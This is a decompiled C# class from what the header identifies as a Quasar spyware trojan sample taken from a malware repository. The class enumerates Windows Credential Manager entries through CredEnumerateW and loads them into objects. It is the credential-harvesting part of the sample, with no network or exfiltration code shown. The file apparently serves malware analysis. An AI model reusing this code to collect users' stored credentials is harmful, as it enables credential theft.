// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.CredentialManagement.CredentialSet
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.Delegates;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NoiseMe.Drags.App.Models.CredentialManagement
{
  public class CredentialSet : List<Credential>, IDisposable
  {
    private bool _disposed;

    public CredentialSet()
    {
    }

    public CredentialSet(string target)
      : this()
    {
      this.Target = !string.IsNullOrEmpty(target) ? target : throw new ArgumentNullException(nameof (target));
    }

    public string Target { get; set; }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    ~CredentialSet() => this.Dispose(false);

    private void Dispose(bool disposing)
    {
      if (!this._disposed && disposing && this.Count > 0)
        this.ForEach((System.Action<Credential>) (cred => cred.Dispose()));
      this._disposed = true;
    }

    public CredentialSet Load()
    {
      this.Loadpublic();
      return this;
    }

    private void Loadpublic()
    {
      IntPtr pCredentials = IntPtr.Zero;
      uint count;
      if (!NativeMethods.CredEnumerateW(this.Target, 0, out count, out pCredentials))
      {
        Trace.WriteLine(string.Format("Win32Exception: {0}", (object) new Win32Exception(Marshal.GetLastWin32Error()).ToString()));
      }
      else
      {
        IntPtr[] source = new IntPtr[(int) count];
        for (int index = 0; (long) index < (long) count; ++index)
          source[index] = Marshal.ReadIntPtr(pCredentials, IntPtr.Size * index);
        List<NativeMethods.CriticalCredentialHandle> list = ((IEnumerable<IntPtr>) source).Select<IntPtr, NativeMethods.CriticalCredentialHandle>((Func<IntPtr, NativeMethods.CriticalCredentialHandle>) (ptrCred => new NativeMethods.CriticalCredentialHandle(ptrCred))).ToList<NativeMethods.CriticalCredentialHandle>();
        this.AddRange(list.Select<NativeMethods.CriticalCredentialHandle, NativeMethods.CREDENTIAL>((Func<NativeMethods.CriticalCredentialHandle, NativeMethods.CREDENTIAL>) (handle => handle.GetCredential())).Select<NativeMethods.CREDENTIAL, Credential>((Func<NativeMethods.CREDENTIAL, Credential>) (nativeCredential =>
        {
          Credential credential = new Credential();
          credential.Loadpublic(nativeCredential);
          return credential;
        })));
        list.ForEach((System.Action<NativeMethods.CriticalCredentialHandle>) (handle => handle.SetHandleAsInvalid()));
        NativeMethods.CredFree(pCredentials);
      }
    }
  }
}
